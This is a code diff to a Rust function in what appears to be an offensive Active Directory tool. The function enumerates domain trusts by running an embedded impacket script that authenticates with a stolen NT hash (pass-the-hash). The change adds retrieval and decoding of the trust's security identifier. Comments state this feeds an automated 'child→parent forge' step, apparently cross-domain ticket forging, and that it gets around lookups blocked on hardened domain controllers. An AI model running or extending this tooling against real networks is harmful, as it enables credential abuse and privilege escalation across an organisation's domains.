@@ -434,13 +434,23 @@ pub async fn enumerate_domain_trusts(args: &Value) -> Result<ToolOutput> {
         };
         // Use impacket's LDAP client for pass-the-hash authentication.
         // Output mimics ldapsearch format so the trust parser can handle it.
+        //
+        // `securityIdentifier` is requested + decoded inline so the parser
+        // gets it in canonical `S-1-5-21-X-Y-Z` form (LDAP returns it as a
+        // binary SID blob). This is what `auto_trust_follow` reads to
+        // satisfy the parent-SID gate on child→parent forge dispatch
+        // without a separate SAMR lookup against the foreign DC — that
+        // lookup is the load-bearing blocker on hardened 2019+ parent DCs
+        // where cross-realm NTLM SAMR is rejected and null-session
+        // lsaquery is disabled by default.
         let ldap_query = format!(
             r#"python3 -c "
 from impacket.ldap import ldap as ldap_mod
+from impacket.ldap.ldaptypes import LDAP_SID
 conn = ldap_mod.LDAPConnection('ldap://{target}', '{base_dn}', '{target}')
 conn.login('{u}', '', '{bind_domain}', lmhash='', nthash='{nt_hash}')
 sc = ldap_mod.SimplePagedResultsControl(size=1000)
-resp = conn.search(searchFilter='(objectClass=trustedDomain)', attributes=['cn','trustDirection','trustType','trustAttributes','flatName'], searchControls=[sc])
+resp = conn.search(searchFilter='(objectClass=trustedDomain)', attributes=['cn','trustDirection','trustType','trustAttributes','flatName','securityIdentifier'], searchControls=[sc])
 for item in resp:
     try:
         dn = str(item['objectName'])
@@ -450,7 +460,14 @@ for item in resp:
         for attr in item['attributes']:
             name = str(attr['type'])
             for val in attr['vals']:
-                print(f'{{name}}: {{val}}')
+                if name == 'securityIdentifier':
+                    try:
+                        sid_obj = LDAP_SID(bytes(val))
+                        print(f'securityIdentifier: {{sid_obj.formatCanonical()}}')
+                    except Exception:
+                        pass
+                else:
+                    print(f'{{name}}: {{val}}')
         print()
     except Exception:
         pass
@@ -494,6 +511,10 @@ for item in resp:
             "trustType",
             "trustAttributes",
             "flatName",
+            // securityIdentifier comes back as base64 (binary SID); the
+            // parser decodes it. Required for child→parent forge — see
+            // the comment block above the impacket variant.
+            "securityIdentifier",
         ])
         .execute()
         .await
